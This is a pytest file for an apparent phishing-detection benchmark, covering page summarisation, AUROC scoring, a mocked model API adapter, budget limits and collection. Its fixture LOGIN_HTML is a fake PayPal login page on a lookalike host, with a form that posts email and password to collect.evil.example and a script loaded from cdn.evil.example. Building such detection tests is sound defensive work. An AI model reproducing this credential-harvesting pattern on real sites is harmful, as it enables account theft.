import gzip
import json

import httpx
import pytest

from phishbench import cli
from phishbench.collect import _collect_benign, _collect_phishing, fetch_page, load_snapshots
from phishbench.models import QUESTION, ModelError, Verdict
from phishbench.models.base import DecisionModel
from phishbench.models.openai_decisions import OpenAIDecisions
from phishbench.reduce import reduce_page
from phishbench.run import load_results, run
from phishbench.score import auroc, score

LOGIN_HTML = """
<html><head><title>PayPal - Log in</title>
<meta name="description" content="Log in to your account">
<script src="https://cdn.evil.example/kit.js"></script><style>.x{color:red}</style></head>
<body><h1>Log in to PayPal</h1>
<form method="post" action="https://collect.evil.example/post.php">
<input type="hidden" name="csrf" value="1">
<input type="email" name="email"><input type="password" name="pass"></form>
<a href="https://www.paypal.com/help">Help</a><a href="/local">Local</a>
<script>var secret = "do not show";</script></body></html>
"""


def test_reduce_keeps_phishing_signals_and_drops_scripts():
    summary = reduce_page("https://paypa1-login.example/", LOGIN_HTML, status=200)
    assert "HOST: paypa1-login.example" in summary
    assert "TITLE: PayPal - Log in" in summary
    assert "PASSWORD FIELDS: 1" in summary
    assert "POST -> collect.evil.example | inputs: email(email), pass(password)" in summary
    assert "LINK HOSTS: www.paypal.com (1)" in summary
    assert "cdn.evil.example (1)" in summary
    assert "Log in to PayPal" in summary
    assert "do not show" not in summary and "csrf" not in summary


def test_reduce_handles_empty_page_and_length_limit():
    assert "(empty page)" in reduce_page("https://x.example/", "", status=404)
    long_page = "<body>" + "word " * 10_000 + "</body>"
    assert len(reduce_page("https://x.example/", long_page, max_chars=500)) == 500


def test_auroc_and_thresholds():
    assert auroc([0.9, 0.8], [0.1, 0.2]) == 1.0
    assert auroc([0.1], [0.9]) == 0.0
    assert auroc([0.5], [0.5]) == 0.5
    results = [
        {"id": "a", "label": "phishing", "probability": 0.95},
        {"id": "b", "label": "phishing", "probability": 0.30},
        {"id": "c", "label": "benign", "probability": 0.60},
        {"id": "d", "label": "benign", "probability": 0.05},
    ]
    row = next(t for t in score(results)["thresholds"] if t["threshold"] == 0.5)
    assert (row["tp"], row["fp"], row["fn"], row["tn"]) == (1, 1, 1, 1)
    assert row["precision"] == 0.5 and row["recall"] == 0.5


def _openai(handler) -> OpenAIDecisions:
    return OpenAIDecisions(api_key="test-key", client=httpx.Client(transport=httpx.MockTransport(handler)))


def test_openai_adapter_request_and_response_shape():
    seen = {}

    def handler(request: httpx.Request) -> httpx.Response:
        seen["url"] = str(request.url)
        seen["auth"] = request.headers["authorization"]
        seen["body"] = json.loads(request.content)
        return httpx.Response(
            200,
            json={
                "model": "gpt-6-luna",
                "answers": [{"type": "predicate", "name": "phishing", "probability": 0.93}],
                "usage": {"input_tokens": 1234, "output_tokens": 0, "total_tokens": 1234},
            },
        )

    verdict = _openai(handler).judge("URL: https://x.example/")
    assert verdict == Verdict(probability=0.93, input_tokens=1234)
    assert seen["url"] == "https://api.openai.com/v1/decisions"
    assert seen["auth"] == "Bearer test-key"
    assert seen["body"] == {
        "model": "gpt-6-luna",
        "input": "URL: https://x.example/",
        "questions": [{"type": "predicate", "name": "phishing", "instructions": QUESTION}],
    }


def test_openai_adapter_refusal_and_fatal_error():
    refusal = {"answers": [{"type": "refusal", "name": "phishing"}], "usage": {"input_tokens": 10}}
    verdict = _openai(lambda r: httpx.Response(200, json=refusal)).judge("x")
    assert verdict.refused and verdict.probability is None

    with pytest.raises(ModelError) as info:
        _openai(lambda r: httpx.Response(401, json={"error": {"message": "bad key"}})).judge("x")
    assert info.value.fatal

    with pytest.raises(ModelError) as info:
        _openai(lambda r: httpx.Response(200, json={"unexpected": True})).judge("x")
    assert not info.value.fatal


def test_openai_adapter_needs_a_key(monkeypatch):
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    with pytest.raises(ModelError):
        OpenAIDecisions()


class _PricedModel(DecisionModel):
    name = "priced"
    usd_per_million_input_tokens = 1_000_000.0  # One dollar for each token.

    def __init__(self):
        self.calls = 0

    def judge(self, page_summary: str) -> Verdict:
        self.calls += 1
        return Verdict(probability=0.5, input_tokens=1)


def _rows(n: int) -> list[dict]:
    return [
        {"id": f"id{i}", "label": "benign", "site": "s", "url": f"https://s{i}.example/", "html": "", "status": 200}
        for i in range(n)
    ]


def test_budget_stops_calls_and_second_run_does_not_repeat(tmp_path):
    out = tmp_path / "r.jsonl"
    model = _PricedModel()
    # Each call reserves its worst case (some hundred dollars here), so a small
    # budget permits no call, and a large budget permits all calls.
    report = run(model, _rows(5), out, budget_usd=10.0, workers=1)
    assert model.calls == 0 and report["skipped_for_budget"] == 5

    report = run(model, _rows(5), out, budget_usd=1e9, workers=2)
    assert model.calls == 5 and report["answered"] == 5 and report["spent_usd"] == 5.0

    report = run(model, _rows(5), out, budget_usd=1e9, workers=2)
    assert model.calls == 5 and report["already_done"] == 5
    assert len(load_results(out)) == 5


def test_collect_with_fake_network():
    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.host == "dead.example":
            raise httpx.ConnectError("down")
        if request.url.path == "/login.php":
            return httpx.Response(200, html=LOGIN_HTML)
        if request.url.host == "phish.example":
            return httpx.Response(404, html="<h1>Not found</h1>")
        return httpx.Response(200, html="<title>Good site</title>")

    client = httpx.Client(transport=httpx.MockTransport(handler))
    assert fetch_page(client, "https://dead.example/")["error"] == "ConnectError"

    class Pool:
        map = staticmethod(lambda fn, items: [fn(i) for i in items])

    urls = ["https://dead.example/a", "https://phish.example/login.php"]
    rows = _collect_phishing(client, urls, 5, Pool)
    assert [(r["targets"], r["status"]) for r in rows] == [(["url"], 200), (["homepage"], 404)]
    assert rows[1]["url"] == "https://phish.example/"

    benign = _collect_benign(client, ["good.example", "dead.example"], 5, Pool)
    assert [(r["site"], r["targets"]) for r in benign] == [("good.example", ["homepage", "url"])]


def test_cli_end_to_end_with_mock_model(tmp_path, monkeypatch, capsys):
    monkeypatch.chdir(tmp_path)
    rows = [
        {"id": "p1", "label": "phishing", "targets": ["homepage"], "site": "p", "url": "https://p.example/",
         "final_url": None, "status": 200, "html": LOGIN_HTML},
        {"id": "p2", "label": "phishing", "targets": ["url"], "site": "p", "url": "https://p.example/x",
         "final_url": None, "status": 200, "html": LOGIN_HTML},
        {"id": "b1", "label": "benign", "targets": ["homepage", "url"], "site": "b", "url": "https://b.example/",
         "final_url": None, "status": 200, "html": "<title>Blog</title><body>Hello</body>"},
    ]
    data = tmp_path / "data" / "snapshots.jsonl.gz"
    data.parent.mkdir()
    with gzip.open(data, "wt") as handle:
        handle.writelines(json.dumps(r) + "\n" for r in rows)

    assert [r["id"] for r in load_snapshots(data, "homepage")] == ["p1", "b1"]
    assert cli.main(["run", "--model", "mock", "--dry-run"]) == 0
    assert not (tmp_path / "results").exists()
    assert cli.main(["run", "--model", "mock"]) == 0
    assert cli.main(["score"]) == 0
    out = capsys.readouterr().out
    assert "mock / html / homepage" in out and "AUROC: 1.000" in out
    summary = json.loads((tmp_path / "results/mock/html/homepage.summary.json").read_text())
    assert summary["feed_labels"]["phishing_pages"] == 1 and summary["feed_labels"]["benign_pages"] == 1


def test_review_removes_unconfirmed_and_duplicate_phishing():
    from phishbench.score import apply_review

    review = {
        "a.example": {"verdict": "phishing", "duplicate_of": None},
        "www.a.example": {"verdict": "phishing", "duplicate_of": "a.example"},
        "dead.example": {"verdict": "dead", "duplicate_of": None},
    }
    results = [
        {"id": "1", "label": "phishing", "site": "a.example", "probability": 0.9},
        {"id": "2", "label": "phishing", "site": "www.a.example", "probability": 0.9},
        {"id": "3", "label": "phishing", "site": "dead.example", "probability": 0.1},
        {"id": "4", "label": "phishing", "site": "not-reviewed.example", "probability": 0.1},
        {"id": "5", "label": "benign", "site": "good.example", "probability": 0.1},
    ]
    assert [r["id"] for r in apply_review(results, review)] == ["1", "5"]
